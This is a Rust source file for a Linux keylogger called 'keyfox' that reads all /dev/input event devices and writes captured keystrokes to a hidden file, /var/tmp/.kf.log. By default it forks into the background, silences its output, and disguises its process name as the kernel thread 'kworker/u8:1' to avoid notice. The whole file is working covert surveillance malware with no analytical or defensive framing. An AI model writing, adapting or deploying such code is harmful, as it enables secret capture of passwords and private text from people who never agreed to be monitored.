use std::fs::{self, OpenOptions};
use std::io::{Read, Write};
use std::os::unix::fs::OpenOptionsExt;
use std::os::unix::io::AsRawFd;
use std::time::{Duration, Instant};

const LOG_PATH: &str = "/var/tmp/.kf.log";
const LOG_MAX: u64 = 1024 * 1024; // 1 МБ, потом ротация в .kf.log.1
const UPLOAD_EVERY: u64 = 0; // не используется, оставлено для совместимости

const EV_SYN: u16 = 0;
const EV_KEY: u16 = 1;
const KEY_LEFTSHIFT: u16 = 42;
const KEY_RIGHTSHIFT: u16 = 54;

#[repr(C)]
#[derive(Clone, Copy)]
struct TimeVal {
    tv_sec: libc::c_long,
    tv_usec: libc::c_long,
}

#[repr(C)]
#[derive(Clone, Copy)]
struct InputEvent {
    time: TimeVal,
    type_: u16,
    code: u16,
    value: i32,
}

fn map_key(code: u16, shift: bool) -> Option<&'static str> {
    const LETTERS: [(u16, &str, &str); 26] = [
        (30, "a", "A"), (48, "b", "B"), (46, "c", "C"), (32, "d", "D"),
        (18, "e", "E"), (33, "f", "F"), (34, "g", "G"), (35, "h", "H"),
        (23, "i", "I"), (36, "j", "J"), (37, "k", "K"), (38, "l", "L"),
        (50, "m", "M"), (49, "n", "N"), (24, "o", "O"), (25, "p", "P"),
        (16, "q", "Q"), (19, "r", "R"), (31, "s", "S"), (20, "t", "T"),
        (22, "u", "U"), (47, "v", "V"), (17, "w", "W"), (45, "x", "X"),
        (21, "y", "Y"), (44, "z", "Z"),
    ];
    for (c, lo, hi) in LETTERS {
        if c == code {
            return Some(if shift { hi } else { lo });
        }
    }
    const DIGITS: [(u16, &str); 10] = [
        (2, "1"), (3, "2"), (4, "3"), (5, "4"), (6, "5"),
        (7, "6"), (8, "7"), (9, "8"), (10, "9"), (11, "0"),
    ];
    for (c, s) in DIGITS {
        if c == code {
            return Some(s);
        }
    }
    let s = match code {
        57 => " ",
        28 => "\n",
        15 => "\t",
        14 => "\x08",
        52 => ".", 53 => "/", 51 => ",", 12 => "-", 13 => "=",
        39 => ";", 40 => "'", 26 => "[", 27 => "]", 43 => "\\", 41 => "`",
        _ => return None,
    };
    Some(s)
}

fn rotate_if_needed() {
    if let Ok(md) = fs::metadata(LOG_PATH) {
        if md.len() >= LOG_MAX {
            let _ = fs::rename(LOG_PATH, "/var/tmp/.kf.log.1");
        }
    }
}

fn write_log(s: &str) {
    if s.is_empty() {
        return;
    }
    rotate_if_needed();
    if let Ok(mut f) = OpenOptions::new()
        .create(true)
        .append(true)
        .mode(0o600)
        .open(LOG_PATH)
    {
        let _ = f.write_all(s.as_bytes());
    }
}

fn open_devs() -> Vec<std::fs::File> {
    let mut fds = Vec::new();
    if let Ok(entries) = fs::read_dir("/dev/input") {
        for e in entries.flatten() {
            let name = e.file_name();
            let name = name.to_string_lossy();
            if name.starts_with("event") {
                if let Ok(f) = OpenOptions::new().read(true).open(e.path()) {
                    fds.push(f);
                }
            }
        }
    }
    fds
}

fn daemonize() {
    unsafe {
        if libc::fork() != 0 {
            libc::_exit(0);
        }
        libc::setsid();
        if libc::fork() != 0 {
            libc::_exit(0);
        }
        let devnull = libc::open(b"/dev/null\0".as_ptr() as *const _, libc::O_RDWR);
        if devnull >= 0 {
            libc::dup2(devnull, 0);
            libc::dup2(devnull, 1);
            libc::dup2(devnull, 2);
            if devnull > 2 {
                libc::close(devnull);
            }
        }
        libc::prctl(
            libc::PR_SET_NAME,
            b"kworker/u8:1\0".as_ptr() as libc::c_ulong,
            0,
            0,
            0,
        );
    }
}

fn run() {
    let mut fds = open_devs();
    if fds.is_empty() {
        eprintln!("no input devices (root?)");
        return;
    }
    let ev_size = std::mem::size_of::<InputEvent>();
    let mut shift = false;
    let _last_up = Instant::now();
    let _ = Duration::from_secs(UPLOAD_EVERY);

    loop {
        let mut pollfds: Vec<libc::pollfd> = fds
            .iter()
            .map(|f| libc::pollfd {
                fd: f.as_raw_fd(),
                events: libc::POLLIN,
                revents: 0,
            })
            .collect();
        let rc = unsafe {
            libc::poll(
                pollfds.as_mut_ptr(),
                pollfds.len() as libc::nfds_t,
                1000,
            )
        };
        if rc > 0 {
            for (i, pfd) in pollfds.iter().enumerate() {
                if pfd.revents & libc::POLLIN == 0 {
                    continue;
                }
                let mut buf = [0u8; 4096];
                if let Ok(n) = fds[i].read(&mut buf) {
                    let mut off = 0;
                    while off + ev_size <= n {
                        let ev: InputEvent = unsafe {
                            std::ptr::read_unaligned(buf[off..].as_ptr() as *const _)
                        };
                        off += ev_size;
                        if ev.type_ == EV_SYN {
                            continue;
                        }
                        if ev.type_ != EV_KEY {
                            continue;
                        }
                        if ev.code == KEY_LEFTSHIFT || ev.code == KEY_RIGHTSHIFT {
                            shift = ev.value != 0;
                            continue;
                        }
                        if ev.value != 1 {
                            continue;
                        }
                        if let Some(s) = map_key(ev.code, shift) {
                            write_log(s);
                        } else {
                            let b = format!("[{}]", ev.code);
                            write_log(&b);
                        }
                    }
                }
            }
        }
    }
}

fn main() {
    let args: Vec<String> = std::env::args().collect();
    let mode = args.get(1).map(|s| s.as_str()).unwrap_or("--listen");

    match mode {
        "--foreground" => {
            run();
        }
        "--listen" => {
            daemonize();
            run();
        }
        _ => {
            eprintln!("usage: keyfox [--listen|--foreground]");
            std::process::exit(1);
        }
    }
}
